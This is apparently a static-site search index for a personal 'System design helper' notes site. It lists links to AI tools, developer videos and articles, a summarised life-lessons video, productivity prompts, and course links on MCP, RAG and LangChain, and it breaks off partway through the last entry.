{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"System design helper","text":""},{"location":"ai-tools/","title":"AI Tools","text":""},{"location":"ai-tools/#web-design","title":"Web Design","text":"<ul> <li>Top 2024 Web Design Trends</li> </ul>"},{"location":"ai-tools/#ai-tool-directories","title":"AI Tool Directories","text":"<ul> <li>The Warehouse</li> </ul>"},{"location":"ai-tools/#web-tools","title":"Web Tools","text":"<ul> <li>Eraser.io</li> <li>Figma</li> <li>Excalidraw</li> <li>Locofy</li> <li>Looka</li> <li>RunwayML</li> <li>Uizard</li> <li>Onlycoms</li> <li>Acorn</li> </ul> <p>Videos - Top 6 Tools to Turn Code into Beautiful Diagrams</p>"},{"location":"ai-tools/#ai-generated-videos","title":"AI-Generated Videos","text":"<ul> <li>Sora</li> <li>AI Generated Videos Just Changed Forever</li> <li>This is Incredible</li> </ul>"},{"location":"ai-tools/#youtube-videos","title":"YouTube Videos","text":"<ul> <li>23 AI Tools You Won't Believe are Free</li> <li>28 AI Tools You'll Be Shocked Are Free</li> <li>7 AI Tools Will Transform Your App Idea to REALITY</li> <li>How to Use AI Art and ChatGPT to Create Insane Web Designs</li> <li>I Tested HUNDREDS of AI Design Tools... These Are the BEST!</li> <li>How to Get a $1000 Logo Design for FREE Using AI?</li> <li>I Tried 108 Free AI Tools. These Are the Best</li> <li>Top 6 Tools to Transform Your App Idea to Reality | Low Code, AI, Design to Code, and More</li> </ul>"},{"location":"ai-tools/#ai-tools-for-code-helpers","title":"AI Tools for Code Helpers","text":"<ul> <li>ChatGPT</li> <li>Bard</li> <li>Phind</li> </ul> <p>Additional Resources - # All Free AI Tools. Is This Website Really Free? \ud83e\udd2f\ud83e\udd2f Free! Free! Free! - 10015.io</p> <p>Marketing Resources - 1000+ Marketing Prompts for ChatGPT</p> <p>https://www.youtube.com/watch?v=ZYUt4WE4Mrw</p> <p>Luma Labs - https://lumalabs.ai/</p> <p>Google Earth Studio - https://earth.google.com/studio/</p> <p>Luma Labs Genie - https://lumalabs.ai/discord</p> <p>Perplexity - https://www.perplexity.ai/</p> <p>SciSpace - https://typeset.io/</p> <p>Google SGE - https://labs.google/</p> <p>Suno -  </p> <p> </p> <p>/ discord </p> <p>MusicGen (WaveFormer) - https://waveformer.replicate.dev/</p> <p>MusicGen (HuggingFace) - https://huggingface.co/spaces/faceboo...</p> <p>textfx - https://textfx.withgoogle.com/</p> <p>LeiaPix - https://convert.leiapix.com/</p> <p>Insta3D - https://huggingface.co/spaces/ilumine...</p> <p>Animated Drawings - https://sketch.metademolab.com/</p> <p>Pika Labs -  </p> <p> </p> <p>/ discord </p> <p>CapCut - https://www.capcut.com/</p> <p>Replicate - https://replicate.com/</p> <p>Upscayl - https://www.upscayl.org/</p> <p>Illusion Diffusion - https://huggingface.co/spaces/AP123/I...</p> <p>Ideogram - https://ideogram.ai/</p> <p>Dalle 3 - https://www.bing.com/create</p> <p>Google SGE - https://labs.google/</p> <p>Playground AI - https://playgroundai.com/</p> <p>Frog Cyborg music video:    [\u2022 PHR\u00d6G - Amphibious Uproar AI Music V... </p> <p>Chapters:</p> <p>0:00 Intro</p> <p>0:18 Luma Labs</p> <p>1:41 Google Earth Studio</p> <p>2:19 Genie</p> <p>3:14 Perplexity</p> <p>4:07 SciSpace</p> <p>5:04 Google SGE</p> <p>6:10 Skillshare</p> <p>7:31 Suno</p> <p>9:36 MusicGen</p> <p>11:22 textFX</p> <p>12:02 LeiaPix</p> <p>12:57 Insta3D</p> <p>13:43 Animated Drawings</p> <p>14:25 Pika Labs</p> <p>15:39 CapCut</p> <p>16:23 Replicate</p> <p>16:57 Upscayl</p> <p>17:27 Illusion Diffusion</p> <p>19:31 Ideogram</p> <p>20:11 Dalle3</p> <p>20:42 Google SGE</p> <p>21:20 Playground AI</p> <p>23:30 Music Video Creation</p> <p>23:58 Frog Cyborg Music Video</p> <p>24:53 Futurepedia</p> <p>ChatSonic AI - https://writesonic.com/chat</p> <p>Durable AI - https://durable.co/</p> <p>Eightify AI - https://eightify.app/</p> <p>Perplexity AI - https://www.perplexity.ai/</p> <p>Runway ML AI - https://runwayml.com/</p> <p>Amazon Code Whisperer AI - https://aws.amazon.com/codewhisperer/</p> <p>Caktus AI - https://www.caktus.ai/</p> <p>https://www.perplexity.ai/</p> <p>https://www.summarize.tech/</p> <p>https://github.com/features/copilot</p> <p>https://www.notion.so/product/ai</p> <p>https://www.mymap.ai/?redirect=superusapp</p> <p>https://10web.io/</p> <p>https://durable.co/</p> <p>https://looka.com/</p> <p>https://www.docu-ask.com/</p> <p>https://www.tidio.com/</p> <p>https://www.adobe.com/sensei/generative-ai/firefly.html</p> <p>https://interiorai.com/</p> <p>https://soundraw.io/</p> <p>https://murf.ai/</p> <p>https://www.nvidia.com/en-us/geforce/broadcasting/broadcast-app/</p> <p>https://www.canva.com/ai-image-generator/</p> <p>https://www.descript.com/</p> <p>Lexica.art </p> <p>descript.com</p> <p>mubert.com</p> <p>Uberduck</p> <p>Nvidia Canvas Ai Painting</p> <p>Replicate Ai Enhance</p> <p>Big Colour Image color</p> <p>Lumalabs Ai third Dimension</p> <p>Chat Gpt plugins -&gt; Summary of video+ AIPRM for chatgpt</p> <p>Supermeme Ai Meme</p> <p>Kaiber Ai Video</p> <p>PDF GPT - https://pdfgpt.io/</p> <p>Parrot AI - https://parrot.ai/</p> <p>Adobe Enhance - https://podcast.adobe.com/enhance </p> <p>InVideo AI (Code \"AEZ25\" for 25% off) - https://invideo.io/?ref=andrewzeng3</p> <p>Perplexity - https://www.perplexity.ai/</p> <p>Stable Diffusion - https://stablediffusionweb.com/</p> <p>Magic Eraser - https://magicstudio.com/magiceraser</p> <p>Tome - https://tome.app/</p> <p>Prime Voice - https://beta.elevenlabs.io/ </p> <p>Reimagine - https://www.reimaginehome.ai/</p> <p>https://bard.google.com/</p> <p>Meet Bard (google.com)</p> <ol> <li>https://vidyo.ai/</li> </ol> <p>AI Based Content Repurposing - vidyo.ai</p> <ol> <li>https://www.beatoven.ai/</li> </ol> <p>Royalty Free Music by Beatoven | Beatoven.ai</p> <ol> <li>https://flair.ai/</li> </ol> <p>Flair</p> <ol> <li>https://scribblediffusion.com/</li> </ol> <p>Scribble Diffusion</p> <ol> <li>https://runwayml.com/</li> </ol> <p>Runway - Advancing creativity with artificial intelligence. (runwayml.com)</p> <ol> <li>https://tome.app/</li> </ol> <p>Tome - The AI-powered storytelling format</p> <p>beatoven.ai</p> <p>Adobe Firefly</p> <p>https://chat.openai.com/ </p> <p>https://bard.google.com/</p> <p>https://www.veed.io/</p> <p>https://www.pexels.com/</p> <p>https://www.canva.com/en_gb/</p> <p>https://vidiq.com/</p> <p>https://www.tubebuddy.com/</p> <p>Stable diffusion AI</p> <p>Text to audio converter -&gt; Already built in Microsoft edge and record it with edge extension </p> <p>AI Music Generator -&gt; STROFE</p> <p>Adobe Sensei -&gt; Captions for your audio</p> <p>Dall-e 2</p> <p>NightCafe</p> <p>Stable Diffusion </p> <p>1\ufe0f\u20e3 Browse Lexica: https://lexica.art/</p> <p>Use NightCafe</p> <p>00:07 - MidJourney AI Art</p> <p>01:24 - Adobe Podcast AI Voice</p> <p>02:18 - Nvidia Broadcast - AI Video Geforce</p> <p>03:10 - Codedamn  - With ChatGPT Support</p> <p>04:19 - Descript - AI Video</p> <p>05:12 - Notion AI - AI Text Generation</p> <p>06:26 - Synthesia - AI Avatar</p> <p>07:00 - Resemble AI - Voice AI</p> <p>07:39 - Soundraw AI - AI Music and Sound</p> <p>08:13 - Futurepedia - AI Tools Database</p> <p>Qwak </p> <p>Generative AI App Builder Google</p> <p>Google PALM</p> <p>Adobe Firefly</p> <p>Generative AI Studio</p> <p>AlphaFold for protein research, Design Thinking at Standford</p> <p>play.ht: https://www.play.ht/?via=mb20</p> <p>canva: https://www.canva.com/</p> <p>pexels: https://www.pexels.com/</p> <p>veed: https://www.veed.io/</p> <p>AutoGPT | https://github.com/Significant-Gravitas/Auto-GPT</p> <p>Godmode.space | https://godmode.space/</p> <p>midjourney</p> <p>miniGPT-4 | https://huggingface.co/Vision-CAIR/MiniGPT-4</p> <p>Adobe firefly | https://firefly.adobe.com/</p> <p>ElevenLabs.io | https://beta.elevenlabs.io/</p> <p>Vall-e GitHub by Microsoft</p> <p>Runway tool | https://research.runwayml.com/gen2</p> <p>Descript.com </p> <p>GitHub copilot-x | https://github.com/features/preview/copilot-x</p> <p>QuillBot | https://quillbot.com/</p> <p>Soundraw.io | https://soundraw.io/</p> <p>Spline AI and SkyBox labs | https://spline.design/</p> <p>WanderStudio  | https://wonderdynamics.com/ </p> <p>Tool 1: https://scribehow.com/</p> <p>Tool 2: https://www.supermeme.ai/</p> <p>Tool 3: https://www.poised.com/</p> <p>Tool 4: https://lumen5.com/</p> <p>Tool 5: https://www.lalal.ai/</p> <p>Tool 6: https://magicstudio.com/magiceraser</p> <p>Tool 7: http://soundraw.io/</p> <p>Tool 8: https://www.copy.ai/ | jasper.io </p> <p>Tool 9: https://www.sembly.ai/</p> <p>Tool 10: https://get.mem.ai/</p> <p>1: https://www.codeium.com/</p> <p>2: https://beta.elevenlabs.io/</p> <p>3: https://www.langotalk.org/</p> <p>4: https://www.humata.ai/</p> <p>5: https://careerdekho.ai/</p> <p>6: https://www.bluewillow.ai/</p> <p>7: https://www.marsx.dev/</p> <p>Stable diffusion</p> <p>Mid journey</p> <p>Dall.e.2 </p> <p>Tools Mentioned in Order of Appearance (with links):</p> <p>NVIDIA Canvas: https://www.nvidia.com/en-us/studio/c...</p> <p>NVIDIA Broadcast: https://www.nvidia.com/en-us/geforce/...</p> <p>NVIDIA Omniverse: https://www.nvidia.com/en-us/omniverse/</p> <p>Versy: https://www.versy.ai/</p> <p>Imagen: https://imagen.research.google/</p> <p>Kaiber: https://www.kaiber.ai/</p> <p>Leia Pix: https://convert.leiapix.com/</p> <p>RunwayML Gen 2: https://research.runwayml.com/gen2</p> <p>Caktus: https://www.caktus.ai/caktus_student</p> <p>Wisdolia: https://chrome.google.com/webstore/de...</p> <p>Rewind: https://www.rewind.ai/</p> <p>Pimeyes: https://pimeyes.com/en</p> <p>Deep Nostalgia: https://www.myheritage.com/deep-nosta...</p> <p>D-ID: https://www.d-id.com/</p> <p>RunwayML: https://runwayml.com/</p> <p>Luma Labs: https://lumalabs.ai/</p> <p>Notion: https://www.notion.so/product/ai</p> <p>Wist Labs: https://wistlabs.com/</p> <p>AutoDraw: https://www.autodraw.com/</p> <p>Reimagine Home: https://www.reimaginehome.ai/</p> <p>Do Not Pay: https://donotpay.com/</p> <p>Soundraw: https://soundraw.io/</p> <p>Mubert: https://mubert.com/render/pricing?via...</p> <p>Eleven Labs: https://beta.elevenlabs.io/</p> <p>Midjourney: https://www.midjourney.com/home/</p> <p>Mixo: https://mixo.io/?via=obscurious</p> <p>Jasper: https://jasper.ai?utm_source=partner&amp;fpr=obscurious</p> <p>Looka: https://looka.com/</p> <p>Poly: https://poly.ai/</p> <p>Synthesia: https://www.synthesia.io/</p> <p>Tome: https://beta.tome.app/</p> <p>Future Tools: https://www.futuretools.io/</p> <p>uizard.ai</p> <p>Seo.ai</p> <p>Synthesis.ai  </p> <p>The Man Behind ChatGPT (Sam Altman) -&gt; https://www.youtube.com/watch?v=GKaVb3jc2No</p> <p>Watch ET Conversations with OpenAI CEO Sam Altman | An ET Exclusive -&gt; https://www.youtube.com/watch?v=AiE7FsdRzz8</p> <p>ET Conversations with ChatGPT founder: Sam Altman on fears from AI and more | Full video -&gt; https://www.youtube.com/watch?v=H1hdQdcM-H4</p> <p>Sam Altman - How to Succeed with a Startup -&gt; https://www.youtube.com/watch?v=0lJKucu6HJc</p> <p>Sam Altman : How to Build the Future -&gt; https://www.youtube.com/watch?v=sYMqVwsewSg</p> <p>Sam Altman - The Man Who Owns Silicon Valley -&gt; https://www.youtube.com/watch?v=1he_Izj8AHc</p> <p>Elon Musk on Sam Altman and ChatGPT: I am the reason OpenAI exists -&gt; https://www.youtube.com/watch?v=bWr-DA5Wjfw</p> <p>ChatGPT boss Reveals Future for AI -&gt; https://www.youtube.com/watch?v=8io6zrr3JiU</p> <p>OpenAI CEO Sam Altman on the Future of AI -&gt; https://www.youtube.com/watch?v=A5uMNMAWi3E</p> <p>ChatGPT boss Sam Altman questioned on AI safety in US Congress - BBC News -&gt; https://www.youtube.com/watch?v=8l0GVXpN2q4</p> <p>GPT-4 - How does it work, and how do I build apps with it? - CS50 Tech Talk -&gt; https://www.youtube.com/watch?v=vw-KWfKwvTQ</p> <p>It\u2019s Time to Pay Attention to A.I. (ChatGPT and Beyond) -&gt; https://www.youtube.com/watch?v=0uQqMxXoNVs</p> <p>GPT-5 Presents EXTREME RISK (Google's New Warning) -&gt; https://www.youtube.com/watch?v=JyVH4FbSwFo</p> <p>Microsofts New 'ORCA' Takes Everyone By SURPRISE! (Now ANNOUNCED!) -&gt; https://www.youtube.com/watch?v=AAwN2SzyNnY</p> <p>AI Drone Kills Operator, GPT 4.2 Leaks,Bard Gets SUPERCHARGED, And Much More [AI NEWS #5] -&gt; https://www.youtube.com/watch?v=89yPjWjss7Y </p> <p>ChatGPT vs Google's Bard: The Ultimate AI Chatbot Showdown -&gt; https://www.youtube.com/watch?v=hEhBQLvhYoY</p> <p>https://www.youtube.com/watch?v=p9Q5a1Vn-Hk -&gt; https://www.youtube.com/watch?v=p9Q5a1Vn-Hk</p> <p>Generative AI for business -&gt; https://www.youtube.com/watch?v=FrDnPTPgEmk</p> <p>The AI War Rages On! Every AMD AI Announcement (Supercut) -&gt; https://www.youtube.com/watch?v=dU3xW5GcJLo</p>"},{"location":"behavioural/","title":"Behavioural","text":"<p>Star Method</p>"},{"location":"behavioural/#be-a-senior-developer","title":"Be a senior developer","text":""},{"location":"behavioural/#medium","title":"Medium","text":""},{"location":"behavioural/#topics","title":"Topics","text":"<ul> <li>Stories to Help You Grow as a Software Developer</li> <li>Leadership</li> </ul>"},{"location":"behavioural/#blogs","title":"Blogs","text":"<ul> <li>Top 10 best practices for code review</li> <li>What I learned from the book Software Architecture: The Hard Parts</li> <li>How to Accumulate Domain Knowledge Like a Senior Engineer</li> <li>Low-code for large projects. It's time.</li> <li>Good Product Thinking</li> <li>I Failed as a Lead Developer. What I've Learned?</li> <li>Clean Code Cheat Sheet for Senior Developers in Daily PR Reviews</li> <li>12 Must-Have Books for Senior Software Engineers</li> <li>Best 30 Solution Architect Interview Questions and Answers (2024)</li> <li>10 Lead Software Developer Principles</li> <li>Good Developer / Great Developer / Exceptional Developer</li> <li>12 Microservices Design Patterns every Software Engineer needs to know</li> </ul>"},{"location":"developer-experiences/","title":"Developer Experiences","text":""},{"location":"developer-experiences/#youtube","title":"Youtube","text":"<ul> <li>7 Things I WISH I Knew Before Becoming a Backend Engineer</li> </ul>"},{"location":"open-source-tools/","title":"Some open source tool","text":""},{"location":"open-source-tools/#cloud-computing","title":"Cloud Computing","text":"<ul> <li>linode</li> <li>aiven</li> </ul>"},{"location":"open-source-tools/#saas-platform","title":"SaaS platform","text":"<ul> <li>pocketbase</li> </ul>"},{"location":"open-source-tools/#youtube","title":"Youtube","text":"<ul> <li>Paying for software is stupid\u2026 10 free and open-source SaaS replacements</li> <li>How To Make AWS Not Suck</li> <li>I tried 5 Firebase alternatives</li> </ul>"},{"location":"open-source-tools/#medium-channels","title":"Medium channels","text":"<ul> <li>Let's Code Future</li> </ul>"},{"location":"open-source-tools/#medium-blogs","title":"Medium blogs","text":"<ul> <li>Automated architecture diagrams</li> <li>9 Best-In-Class New Tools for Software Developers</li> <li>9 Best-In-Class AI Tools Software Developers Need to Know for 2024</li> <li>7 AI Tools Every Software Developer Needs to Know</li> <li>Software Engineers: 8 Best AI Tools To Do Less Busy-Work in 2024</li> <li>Engineering leads: 7 AI productivity tools for your devs to master in 2024</li> <li>8 Best-In-Class Tools for Project Managers to Try in 2024</li> <li>6 AI Tools and Software Product Managers Should Know</li> <li>100+ FREE Resources Every Web Developer Must Try</li> <li>15 Time-Saving Websites Every Developer Needs</li> </ul>"},{"location":"open-source-tools/#common","title":"Common","text":"<ul> <li>Top 30 Coding Tools Every Developer Should Have in Their Toolbox</li> </ul>"},{"location":"open-source-tools/#frontend","title":"Frontend","text":"<ul> <li>Top 7 Crazy Frontend Resources I Wish I Knew Sooner</li> </ul>"},{"location":"open-source-tools/#open-source-projects","title":"Open-Source Projects","text":"<ul> <li>Top 7 Powerful Open-Source Projects You've Never Heard Of (2025)</li> <li>5 Open Source Projects That'll Make You a Better Developer in 2025 \u2014 Developers, Don't Miss These</li> </ul>"},{"location":"open-source-tools/#ai","title":"AI","text":"<ul> <li>7 AI Tools Every Developer Should Know in 2025!</li> </ul>"},{"location":"software-architect/","title":"Software Architect","text":""},{"location":"software-architect/#medium","title":"Medium","text":"<ul> <li> <p>The Truth About Code Optimization You Won't Hear From Your Senior Developer</p> </li> <li> <p>How Senior Engineers Think Differently: 10 Mental Models You Need</p> </li> <li>7 Productivity Hacks I Learned from a Principal Software Engineer!</li> <li>8 Habits That Can Make You an Unstoppable Software Engineer</li> <li>10 Lessons I Learned from a Principal Engineer That Made Me a Better Developer</li> <li>How I Make Better Architectural Decisions as a Senior Developer</li> <li>How to Become a Strong Software Architect</li> <li> <p>23 Fundamental Principles for Software Architects</p> </li> <li> <p>The Ultimate Toolkit to Get Promoted as a Software Engineer</p> </li> <li> <p>9 Subjects I've Changed My Mind About as a Software Engineer</p> </li> <li> <p>Ultimate Guide to Clean Code with over 30 Java Refactoring Examples</p> </li> <li> <p>The Biggest Mistakes I Made as a Beginner Programmer (And How to Avoid Them!)</p> </li> <li> <p>5 Habits Killing Your Productivity \u2014 According to the Greatest Stoic Philosophers</p> </li> <li> <p>10 Must-Know Cloud Native Architecture Patterns</p> </li> <li> <p>8 Legendary Websites That Save 5 Hours Per Day</p> </li> <li> <p>How to master at PR Reviews for Senior Devs</p> </li> <li>Clean Code Cheat Sheet for Senior Developers in Daily PR Reviews</li> </ul>"},{"location":"wisdom/","title":"Wisdom","text":""},{"location":"wisdom/#summary-of-40-life-lessons-learned-at-43","title":"Summary of \"40 Life Lessons Learned at 43\"","text":"<p>In the engaging video titled \"40 Life Lessons Learned at 43,\" the creator shares a comprehensive collection of insights and experiences accumulated over the years. These lessons are thoughtfully categorized into seven key areas: Relationships, Finances, Career, Programming, Fitness, Lifestyle, and Time Management. Each lesson is designed to inspire viewers to reflect on their own lives and encourage personal growth. Below is a detailed breakdown of the key lessons discussed:</p>"},{"location":"wisdom/#relationships","title":"Relationships","text":"<ol> <li> <p>Act Your Age: Embrace the wisdom that comes with age instead of trying to fit in with younger colleagues. Recognize that your life experiences provide valuable perspectives that can contribute positively to your workplace and social interactions.</p> </li> <li> <p>Say What You Mean: Cultivate the habit of direct and honest communication. This not only helps in avoiding misunderstandings but also builds trust in both personal and professional relationships.</p> </li> <li> <p>Stop Wasting Time: Be intentional about how you spend your time. Focus on activities that create lasting memories and contribute to your personal goals rather than getting caught up in trivial pursuits.</p> </li> </ol>"},{"location":"wisdom/#finances","title":"Finances","text":"<ol> <li> <p>Multiple Income Streams: Consider establishing diverse sources of income, such as side gigs or investments. This strategy enhances financial security and reduces reliance on a single paycheck.</p> </li> <li> <p>Financial Literacy: Take the time to educate yourself about budgeting, saving, and investing. Tools like YNAB (You Need A Budget) can assist you in managing your finances effectively and achieving your financial goals.</p> </li> <li> <p>Cautious 401(k) Contributions: While it's important to save for retirement through a 401(k), ensure that you balance these contributions with other investment opportunities that may offer better returns or liquidity.</p> </li> </ol>"},{"location":"wisdom/#career","title":"Career","text":"<ol> <li> <p>Use Your Webcam: In virtual meetings, turning on your webcam fosters engagement and connection with colleagues. It helps create a more interactive environment where everyone feels involved.</p> </li> <li> <p>Humanize Interviews: Approach job interviews as conversations rather than formal interrogations. Remember that interviewers are humans too; building rapport can lead to a more relaxed atmosphere and better outcomes.</p> </li> <li> <p>Keep Options Open: Regularly explore job opportunities even if you're currently satisfied in your role. This proactive approach can open doors to new career paths and prevent complacency.</p> </li> <li> <p>Be Direct at Work: Foster an open work environment by communicating clearly and assertively with your colleagues and management. This transparency encourages collaboration and minimizes confusion.</p> </li> <li> <p>Follow Your Interests: As your interests evolve over time, don't hesitate to shift roles within your organization or industry. Pursuing what you're passionate about leads to greater job satisfaction and productivity.</p> </li> <li> <p>Invest in Education: Continuously seek opportunities for learning\u2014whether through formal education or self-study\u2014to stay relevant in your field and enhance your skill set.</p> </li> <li> <p>Network Actively: Build and nurture professional relationships that can support you throughout your career journey. Networking can lead to mentorship opportunities, collaborations, and new job prospects.</p> </li> <li> <p>Develop Soft Skills: While technical skills are essential, soft skills like communication, teamwork, and emotional intelligence are equally important for career advancement and workplace harmony.</p> </li> <li> <p>Be Accountable: When mistakes happen, take ownership rather than deflecting blame. Accountability fosters trust among colleagues and encourages a culture of continuous improvement.</p> </li> <li> <p>Gain Domain Knowledge: Strive to understand the broader context of your projects beyond just technical details. This knowledge enhances your ability to make informed decisions and contribute meaningfully to team discussions.</p> </li> </ol>"},{"location":"wisdom/#programming","title":"Programming","text":"<ol> <li> <p>Learn Pseudocode: Before writing actual code, outline your logic using pseudocode. This practice helps clarify your thoughts and ensures a smoother coding process by identifying potential issues early on.</p> </li> <li> <p>Merge Before Pushing: Regularly integrate changes into the main codebase before pushing updates to avoid conflicts with other developers' work, promoting smoother collaboration within teams.</p> </li> <li> <p>Pad Time Estimates: When estimating how long tasks will take, add extra time for unforeseen challenges or complications. This approach reduces stress and improves project management.</p> </li> <li> <p>Read \"Grokking Algorithms\": Familiarize yourself with fundamental programming concepts by reading resources like \"Grokking Algorithms.\" Understanding algorithms is crucial for efficient coding and problem-solving.</p> </li> <li> <p>Problem Solving Focus: Shift your mindset from merely writing code to solving real-world problems with technology; this perspective makes your work more impactful and fulfilling.</p> </li> <li> <p>Know Yourself as a Developer: Embrace your unique strengths as a developer while recognizing areas for improvement. Learning from others is valuable, but avoid unhealthy comparisons that can hinder your growth.</p> </li> <li> <p>Take on Hard Tasks: Challenge yourself by tackling difficult projects or problems; this not only enhances your skills but also builds resilience and confidence in your abilities.</p> </li> <li> <p>Complete Projects Independently: Seek opportunities to finish substantial coding projects on your own; this hands-on experience deepens understanding and reinforces learning.</p> </li> <li> <p>Balance Coding with Hobbies: Maintain interests outside of programming to prevent burnout; engaging in hobbies can refresh your mind, boost creativity, and improve overall well-being.</p> </li> </ol>"},{"location":"wisdom/#fitness","title":"Fitness","text":"<ol> <li> <p>Prioritize Health: Make physical and mental health a top priority; consider regular check-ups, exercise routines, and mental health practices as essential components of a balanced life.</p> </li> <li> <p>Avoid Sedentary Lifestyles: Combat the negative effects of prolonged sitting by investing in ergonomic solutions like standing desks or incorporating movement breaks throughout the day.</p> </li> <li> <p>Stay Hydrated: Drinking adequate water is crucial for maintaining energy levels, focus, and overall health\u2014make it a habit to keep water accessible throughout the day.</p> </li> <li> <p>Regular Exercise: Commit to a consistent exercise routine several times a week; physical activity is vital for both mental clarity and physical fitness, contributing significantly to overall well-being.</p> </li> </ol>"},{"location":"wisdom/#lifestyle","title":"Lifestyle","text":"<ol> <li> <p>Travel More: Make travel a priority whenever possible; exploring new cultures and environments enriches life experiences and broadens perspectives beyond everyday routines.</p> </li> <li> <p>Challenge Yourself Daily: Set aside time each day to take on one difficult task; this practice promotes personal growth, resilience, and a sense of accomplishment over time.</p> </li> <li> <p>Save the easiest tasks for the end of the workday: This allows you to leave on time.  Tackling simple tasks at the end of the day can help you wind down and feel productive.</p> </li> <li> <p>Maximize Paid Time Off (PTO): Don't hesitate to fully utilize vacation time; taking breaks is essential for recharging energy levels and maintaining long-term productivity in both work and life.</p> </li> </ol>"},{"location":"wisdom/#time-management","title":"Time Management","text":"<ol> <li> <p>Prioritize Relationships Over Tasks: Recognize that relationships are more important than mere productivity metrics; investing time in people leads to deeper connections and greater fulfillment in life.</p> </li> <li> <p>Self-Reflection is Key: Regularly assess your goals, progress, and overall satisfaction; self-reflection helps ensure that you remain aligned with your values while making necessary adjustments along the way.</p> </li> </ol> <p>The video encourages viewers not only to reflect on these lessons but also to share their own experiences in the comments section, fostering a supportive community focused on learning from one another.</p> <p>\ud83d\udda5 10 Prompts to Transform You Into a Superhuman\ud83e\udde0 | by Umadevi R | Apr, 2025 | Medium </p> <ol> <li>Design the Ultimate Daily Schedule</li> </ol> <p>Prompt: \"Help me create the ultimate daily schedule that optimizes productivity and energy. Consider my waking hours from [specific start time] to [specific end time], including work tasks, breaks, meals, exercise, and personal development. Ensure the schedule is realistic, sustainable, and maximizes focus and efficiency.\" 2. Master Time-Blocking</p> <p>Prompt: \"Teach me how to implement time-blocking effectively in my daily routine. Show me how to prioritize my tasks into focused blocks, including specific examples for [type of tasks], and how to handle interruptions without losing momentum.\"</p> <ol> <li>Eliminate Procrastination</li> </ol> <p>Prompt: \"Guide me through the process of eliminating procrastination. Include strategies for identifying my procrastination triggers, using tools like the Pomodoro technique, and creating a mindset that prioritizes action over delay for [specific tasks or goals].</p> <ol> <li>Build the Perfect Morning Routine</li> </ol> <p>Prompt: \"Help me craft a morning routine that sets the tone for a super-productive day. Include steps for waking up early, incorporating activities like exercise, journaling, and planning the day, and maintaining high energy levels throughout the morning.\" 5. Set and Achieve Goals</p> <p>Prompt: \"Guide me in setting SMART goals for [specific area] and breaking them into actionable steps. Include advice on tracking progress, staying motivated, and overcoming obstacles to ensure consistent progress and long-term success.\" 6. Master Deep Work</p> <p>Prompt: \"Show me how to integrate deep work sessions into my daily routine. Include strategies for minimizing distractions, creating an optimal workspace, and focusing intensely on high-priority tasks in [specific area of work].\" 7. Develop Keystone Habits</p> <p>Prompt: \"Teach me how to identify and build keystone habits that will transform my productivity. Provide examples of habits in [specific area] that have a domino effect, such as regular exercise, daily planning, or consistent learning.\" 8. Automate Repetitive Tasks</p> <p>Prompt: \"Guide me in identifying and automating repetitive tasks in my personal and professional life. Include tools and systems for [specific tasks] that save time and allow me to focus on high-impact activities.\" 9. Master Priority Management</p> <p>Prompt: \"Show me how to prioritize tasks using methods like the Eisenhower Matrix or the 80/20 rule. Help me identify my most impactful tasks in [specific field] and create a system for focusing on what truly matters.\" 10. Implement a Continuous Improvement System</p> <p>Prompt: \"Teach me how to implement a system of continuous improvement for my productivity. Include strategies like daily reflections, weekly reviews, and tracking key productivity metrics to ensure consistent growth in [specific area].\"</p>"},{"location":"ai/MCP/","title":"MCP (Model Context Protocol)","text":""},{"location":"ai/MCP/#youtube","title":"Youtube","text":""},{"location":"ai/MCP/#introduction","title":"Introduction","text":"<ul> <li>Model Context Protocol (MCP) Explained for Beginners: AI Flight Booking Demo!</li> <li> <p>MCP Tutorial: Build Your First MCP Server and Client from Scratch (Free Labs)</p> </li> <li> <p>MCP Servers - Next Big Thing in AI</p> </li> <li> <p>Tool Calling VS MCP in AI Agents | Model Context Protocol Explained</p> </li> <li> <p>Why Everyone's Talking About MCP?</p> </li> <li>99% of Developers Don't Get MCP</li> <li>Why MCP really is a big deal | Model Context Protocol with Tim Berglund</li> <li>MCP Tutorial: Build Your First MCP Server</li> <li>Model Context Protocol Clearly Explained | MCP Beyond the Hype</li> <li>Build Anything with MCP Agents\u2026 Here's How</li> <li>Build Anything With a CUSTOM MCP Server - Python Tutorial</li> </ul>"},{"location":"ai/MCP/#course","title":"Course","text":"<ul> <li>MCP Crash Course for Python Developers</li> <li>The Ultimate MCP Crash Course - Build From Scratch</li> </ul>"},{"location":"ai/RAG/","title":"Retrieval-Augmented Generation (RAG)","text":""},{"location":"ai/RAG/#youtube","title":"Youtube","text":"<ul> <li>Complete RAG Crash Course With Langchain In 2 Hours</li> </ul>"},{"location":"ai/RAG/#freecodecamp","title":"Freecodecamp","text":"<ul> <li>Learn RAG From Scratch - Python AI Tutorial from a LangChain Engineer</li> </ul>"},{"location":"ai/ai-agent/","title":"AI Agent","text":""},{"location":"ai/ai-agent/#youtube","title":"Youtube","text":"<ul> <li>Build an AI Agent From Scratch in Python - Tutorial for Beginners</li> </ul>"},{"location":"ai/ai/","title":"AI","text":""},{"location":"ai/ai/#youtube","title":"Youtube","text":""},{"location":"ai/ai/#introduction","title":"Introduction","text":""},{"location":"ai/ai/#course","title":"Course","text":"<ul> <li>Learn AI with KodeKloud</li> </ul>"},{"location":"ai/gen-ai/","title":"Gen AI","text":""},{"location":"ai/gen-ai/#youtube","title":"Youtube","text":"<ul> <li> <p>GenAI For Developers Roadmap 2025</p> </li> <li> <p>Gen AI Course | Gen AI Tutorial For Beginners</p> </li> <li> <p>GenAI Full Course</p> </li> <li>Generative AI using LangChain</li> <li>The Only GenAI Roadmap You'll Ever Need | Map of Generative AI for Everyone | CampusX</li> </ul>"},{"location":"ai/gen-ai/#freecodecamp","title":"freecodecamp","text":"<ul> <li>Generative AI for Developers - Comprehensive Course</li> <li>GenAI Essentials - Full Course for Beginners</li> <li>Generative AI Full Course - Gemini Pro, OpenAI, Llama, Langchain, Pinecone, Vector Databases &amp; More</li> <li>Google Generative AI Leader Certification Course - Pass the Exam!</li> </ul>"},{"location":"ai/langchain/","title":"Langchain","text":""},{"location":"ai/langchain/#youtube","title":"Youtube","text":"<ul> <li>LangChain Crash Course For Beginners | LangChain Tutorial</li> <li>LangChain Full Crash Course - AI Agents in Python</li> <li>LangChain Tutorial for Beginners | Generative AI Series \ud83d\udd25</li> <li>Updated Langchain Version V1 Crash Course- Build Autonomous Agents</li> <li>Complete Langchain Course For Generative AI In 3 Hours</li> <li> <p>LangChain Mastery in 2025 | Full 5 Hour Course [LangChain v0.3]</p> </li> <li> <p>LangChain Tutorials Playlist | LLM 